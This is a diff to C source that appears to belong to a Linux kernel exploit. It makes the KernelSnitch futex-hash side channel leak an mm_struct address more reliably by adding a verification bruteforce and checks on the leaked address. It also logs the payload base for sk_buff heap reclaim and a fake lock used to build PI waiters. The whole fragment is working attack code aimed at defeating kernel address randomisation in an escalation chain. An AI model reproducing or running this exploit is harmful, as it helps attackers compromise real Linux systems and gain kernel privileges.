@@ -764,6 +764,10 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
   ks = kernelsnitch_setup(
       MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
+  pr_info("kernelsnitch hashsize=%lu cpus_online=%d collisions=%d "
+          "mm_sz=0x%x order=%d\n",
+          (unsigned long)futex_hashsize, cpu_count, KSNITCH_COLLISIONS,
+          (unsigned)MM_STRUCT_SZ, MM_ORDER);
 #if defined(APP_PAYLOAD) && APP_PAYLOAD && \
     defined(SLIDE_KSNITCH_APPENDED_FUTEXES)
   if (payload_mode == PAGE_PAYLOAD_SLIDE) {
@@ -825,9 +829,48 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     return 0;
   }
 
+  /*
+   * Parallel first-wins bruteforce can accept a jhash false positive in an
+   * unmapped direct-map hole. A second independent scan must agree before we
+   * build PI waiters that spin_lock the derived address (panic on miss).
+   */
+  ks->found = 0;
+  ks->mm_struct = (size_t)-1;
+  ks->state = KERNELSNITCH_COLLISIONS_FOUND;
+  kernelsnitch_bruteforce(ks);
+  uintptr_t leaked_verify = ks->mm_struct;
+  if (leaked_verify == (uintptr_t)-1 || leaked_verify != leaked) {
+    pr_warning("KernelSnitch mm_struct unstable leak=%016zx verify=%016zx\n",
+               leaked, leaked_verify);
+    kernelsnitch_cleanup(ks);
+    ks = NULL;
+    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
+      kill_child(prepare_ctx.childs[i]);
+    }
+    cleanup_page_prepare_state();
+    return 0;
+  }
+
   uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
-  pr_info("mm leaked=%016zx base=%016zx object_index=%zu\n",
-          leaked, base, (leaked - base) / MM_STRUCT_SZ);
+  if ((leaked - base) % MM_STRUCT_SZ != 0 ||
+      !is_direct_ptr(base) ||
+      !is_direct_ptr(base + ORDER3_SIZE - 1)) {
+    pr_warning("KernelSnitch mm_struct implausible leaked=%016zx base=%016zx\n",
+               leaked, base);
+    kernelsnitch_cleanup(ks);
+    ks = NULL;
+    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
+      kill_child(prepare_ctx.childs[i]);
+    }
+    cleanup_page_prepare_state();
+    return 0;
+  }
+
+  uintptr_t payload_base = base + (uintptr_t)SKB_DATA_DELTA;
+  pr_info("mm leaked=%016zx base=%016zx object_index=%zu "
+          "payload_base=%016zx skb_delta=%lld\n",
+          leaked, base, (leaked - base) / MM_STRUCT_SZ, payload_base,
+          (long long)SKB_DATA_DELTA);
   if (!prepare_skb_payload(base, payload_mode)) {
     kernelsnitch_cleanup(ks);
     ks = NULL;
@@ -914,8 +957,10 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     }
     reclaim_sent++;
   }
-  pr_info("sk_buff reclaim sends=%d/%d mode=%d\n",
-          reclaim_sent, reclaim_sends, payload_mode);
+  pr_info("sk_buff reclaim sends=%d/%d mode=%d base=%016zx "
+          "payload_base=%016zx fake_lock=%016zx\n",
+          reclaim_sent, reclaim_sends, payload_mode, base,
+          base + (uintptr_t)SKB_DATA_DELTA, fake_lock);
   kernelsnitch_cleanup(ks);
   ks = NULL;
 
